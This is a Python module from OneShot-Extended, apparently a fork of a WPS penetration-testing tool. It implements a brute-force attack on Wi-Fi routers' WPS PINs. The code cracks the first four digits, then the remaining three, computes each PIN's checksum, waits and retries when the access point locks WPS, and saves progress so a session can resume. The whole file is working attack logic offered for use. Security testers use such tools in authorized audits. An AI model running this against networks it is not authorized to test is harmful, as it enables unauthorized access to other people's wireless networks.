#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
#  Copyright (C) 2026 chickendrop89
#
#  This program is free software; you can redistribute it and/or
#  modify it under the terms of the GNU General Public License
#  as published by the Free Software Foundation; either version 2
#  of the License, or (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.

import collections
import statistics
import time

from datetime import datetime
from src import logger

import src.wps.generator
import src.wps.connection
import src.utils
import src.args

args = src.args.parseArgs()

class BruteforceStatus:
    """Stores bruteforce details and status."""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time() # Last PIN attempt start time
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def displayStatus(self):
        """
        Displays the current status of the brute force process, including the 
        percentage of completion, start time, and average time per PIN attempt.
        """
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        """
        Registers an attempt with the given mask, updates the attempt counter,
        records the time taken since the last attempt, and displays status if
        the counter reaches the statistics period.
        """
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()

class Initialize:
    """Handles bruteforce"""

    def __init__(self, interface: str):
        self.BRUTEFORCE_STATUS = BruteforceStatus()
        self.CONNECTION_STATUS = src.wps.connection.ConnectionStatus()
        self.GENERATOR  = src.wps.generator.WPSpin()
        self.CONNECTION = src.wps.connection.Initialize(
            interface
        )

    def _firstHalfBruteforce(self, bssid: str, first_half: str) -> str | bool:
        """Attempts to bruteforce the first half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(first_half) < 10000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + '000')
            pin = f'{first_half}000{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.isFirstHalfValid():
                logger.info('First half found')
                return first_half

            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._firstHalfBruteforce(bssid, first_half)

            first_half = str(int(first_half) + 1).zfill(4)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half)

            if args.delay:
                time.sleep(args.delay)

        logger.warning('First half not found')
        return False

    def _secondHalfBruteforce(self, bssid: str, first_half: str, second_half: str) -> str | bool:
        """Attempts to bruteforce the second half of a WPS PIN"""

        checksum = self.GENERATOR.checksum

        while int(second_half) < 1000:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting bruteforce.')
                return False

            t = int(first_half + second_half)
            pin = f'{first_half}{second_half}{checksum(t)}'

            self.CONNECTION.singleConnection(bssid, pin)

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {args.timeout}s…')
                time.sleep(args.timeout)
                continue

            if self.CONNECTION.CONNECTION_STATUS.LAST_M_MESSAGE > 6:
                return pin

            if self.CONNECTION.CONNECTION_STATUS.STATUS == 'WPS_FAIL':
                logger.warning('WPS transaction failed, re-trying last pin')
                return self._secondHalfBruteforce(bssid, first_half, second_half)

            second_half = str(int(second_half) + 1).zfill(3)
            self.BRUTEFORCE_STATUS.registerAttempt(first_half + second_half)

            if args.delay:
                time.sleep(args.delay)

        return False

    def smartBruteforce(self, bssid: str, start_pin: str = None):
        """Attempts to bruteforce a WPS PIN."""

        sessions_dir = src.utils.SESSIONS_DIR
        filename = f'''{sessions_dir}{bssid.replace(':', '').upper()}.run'''

        if (not start_pin) or (len(start_pin) < 4):
            try:
                # Trying to restore previous session
                with open(filename, 'r', encoding='utf-8') as file:
                    if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        self.BRUTEFORCE_STATUS.MASK = mask

        try:
            if len(mask) == 4:
                first_half = self._firstHalfBruteforce(bssid, mask)
                if first_half and (self.CONNECTION_STATUS.STATUS != 'GOT_PSK'):
                    self._secondHalfBruteforce(bssid, first_half, '001')
            elif len(mask) == 7:
                first_half = mask[:4]
                second_half = mask[4:]
                self._secondHalfBruteforce(bssid, first_half, second_half)
            raise KeyboardInterrupt
        except KeyboardInterrupt as e:
            logger.info('Aborting…')

            with open(filename, 'w', encoding='utf-8') as file:
                file.write(self.BRUTEFORCE_STATUS.MASK)
            logger.info(f'Session saved in {filename}')

            if args.loop:
                raise KeyboardInterrupt from e
